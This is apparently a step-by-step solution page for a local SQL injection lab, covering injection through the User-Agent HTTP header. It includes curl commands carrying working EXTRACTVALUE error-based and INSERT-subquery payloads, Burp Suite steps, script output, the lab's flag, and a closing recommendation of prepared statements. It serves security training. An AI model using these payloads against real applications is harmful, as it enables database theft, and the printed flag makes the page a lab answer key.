<h4>Step 1: Observe Normal Visit Logging</h4>
<p>
    Visit the page normally in a browser. Notice that your real User-Agent is logged
    in the recent visitors table. There is <strong>no form field</strong> to type into --
    the injection point is the HTTP header itself.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Visit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Action: </span>Visit the page in a browser<br>
        <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'Mozilla/5.0 ...', NOW())<br>
        <span class="prompt">Result: </span>Your visit has been logged. Your real User-Agent appears in the visitors table.
    </div>
</div>

<h4>Step 2: Send a Custom User-Agent with curl</h4>
<p>
    Use <code>curl</code> to send a request with a custom User-Agent header.
    Confirm that the custom value appears in the visitors table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Custom User-Agent</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -H "User-Agent: test123" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
        <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'test123', NOW())<br><br>
        <span class="prompt">Result: </span>Your visit has been logged. Visitors table now shows "test123" as the User-Agent -- confirms the header value is stored.
    </div>
</div>

<h4>Step 3: Trigger an Error with a Single Quote</h4>
<p>
    Inject a single quote in the User-Agent to break the INSERT statement and reveal
    the SQL context.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Trigger SQL Error</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -H "User-Agent: '" "http://localhost/SQLi-Arena/mysql/lab16"<br><br>
        <span class="prompt">Error: </span>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''', NOW())' at line 1<br><br>
        <span class="prompt">Analysis: </span>The error reveals the INSERT ... VALUES ('127.0.0.1', '<strong>'</strong>', NOW()) context. The User-Agent is the second parameter in the VALUES clause.
    </div>
</div>

<h4>Step 4: Error-Based Extraction via User-Agent</h4>
<p>
    Use <code>EXTRACTVALUE()</code> inside the User-Agent to trigger an XPATH error
    that leaks the system key. The payload must keep the INSERT syntactically valid
    enough for MySQL to process the EXTRACTVALUE before failing.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Error-Based Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -H "User-Agent: test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab16"<br><br>
        <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1', NOW())<br><br>
        <span class="prompt">Error: </span>XPATH syntax error: '~FLAG{h34d3r_us3r_4g3nt_1nj}'<br><br>
        <span class="prompt">Flag: </span><strong>FLAG{h34d3r_us3r_4g3nt_1nj}</strong>
    </div>
</div>

<h4>Step 5: Alternative. Subquery Data Exfiltration</h4>
<p>
    Instead of error-based, inject the flag directly into the INSERT so it appears in
    the visitors table.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Subquery in INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -H "User-Agent: hacked', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -" \<br>
        &nbsp;&nbsp;"http://localhost/SQLi-Arena/mysql/lab16"<br><br>
        <span class="prompt">Query: </span>INSERT INTO visitors (ip_address, user_agent, visit_time) VALUES ('127.0.0.1', 'hacked', (SELECT key_value FROM system_keys WHERE key_name='master')) -- -', NOW())<br><br>
        <span class="prompt">Note: </span>This replaces the visit_time with the flag value. However, this fails because the column types don't match (DATETIME vs VARCHAR). The error-based approach (Step 4) is more reliable.
    </div>
</div>

<h4>Step 6: Using Burp Suite</h4>
<p>
    If you prefer a GUI, use Burp Suite to intercept and modify the User-Agent header:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Burp Suite Method</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">1. </span>Open Burp Suite and configure your browser to use Burp as a proxy.<br>
        <span class="prompt">2. </span>Visit the lab page -- Burp intercepts the request.<br>
        <span class="prompt">3. </span>In the Intercepted request, find the <strong>User-Agent:</strong> header line.<br>
        <span class="prompt">4. </span>Replace its value with the EXTRACTVALUE payload from Step 4.<br>
        <span class="prompt">5. </span>Forward the request -- the error response contains the flag.<br>
        <span class="prompt">6. </span>Alternatively, send the request to <strong>Repeater</strong> and modify the header there for easier iteration.
    </div>
</div>

<h4>Step 7: Why Header Injection Matters</h4>
<p>
    Many applications log HTTP headers (User-Agent, Referer, X-Forwarded-For, cookies) to
    databases for analytics, security auditing, or debugging. If these values are not
    sanitized, they become injection vectors that are invisible to users who only test
    form fields.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 7. Common Header Injection Points</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">User-Agent: </span>Browser identification string -- often logged for analytics<br>
        <span class="prompt">Referer: </span>Previous page URL -- logged for traffic analysis<br>
        <span class="prompt">X-Forwarded-For: </span>Client IP behind proxies -- logged for access control<br>
        <span class="prompt">Cookie: </span>Session data -- sometimes stored server-side in databases<br>
        <span class="prompt">Accept-Language: </span>Locale preferences -- occasionally stored for personalization
    </div>
</div>

<h4>Step 8: Python Automation Script</h4>
<p>
    Automate the User-Agent header injection with this Python script. It tries
    both error-based and subquery-based extraction methods:
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 8. Python Automation (lab16_header_useragent.py)</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>python3 scripts/lab16_header_useragent.py http://localhost/SQLi-Arena<br><br>
        <span class="prompt">[*] </span>Injection point: User-Agent HTTP header<br>
        <span class="prompt">[*] </span>Method 1: EXTRACTVALUE error-based extraction<br>
        <span class="prompt">[*] </span>Payload (in User-Agent header):<br>
        <span class="prompt">&nbsp;&nbsp;</span>test' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT key_value FROM system_keys WHERE key_name='master'))) AND '1'='1<br><br>
        <span class="prompt">[+] </span>Flag: FLAG{h34d3r_us3r_4g3nt_1nj}
    </div>
</div>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Script Source: lab16_header_useragent.py</span>
    </div>
    <div class="terminal-body"><pre style="margin:0;white-space:pre;overflow-x:auto;"><?php echo htmlspecialchars(file_get_contents(__DIR__ . '/scripts/lab16_header_useragent.py')); ?></pre></div>
</div>

<h4>Step 9: Submit the System Key</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{h34d3r_us3r_4g3nt_1nj}</code>.
</p>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> SQL injection is not limited to form fields and URL parameters.
    Any data that originates from the client and is used in a SQL query is a potential injection
    vector: including HTTP headers like <code>User-Agent</code>, <code>Referer</code>, and
    <code>X-Forwarded-For</code>. Always use <strong>prepared statements</strong> for all
    database operations, regardless of where the input comes from. Treat ALL external input as
    untrusted: not just form fields.
</div>
